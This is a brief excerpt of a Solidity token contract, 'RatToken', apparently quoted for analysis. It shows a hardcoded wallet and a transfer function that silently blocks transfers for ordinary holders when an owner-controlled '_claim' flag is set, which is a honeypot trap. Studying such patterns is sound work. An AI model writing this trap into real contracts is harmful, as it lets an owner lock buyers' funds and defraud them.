...
contract RatToken is Context, IERC20, Ownable {
    ...
    address public  _marketingWallet = 0xce7e69a9b819DC5942458BC82cC802FFd006f28b;
    ...
    function _transfer(
        ...
        if(from != owner() && to != owner() && from != uniswapV2Pair && _claim){ return; }
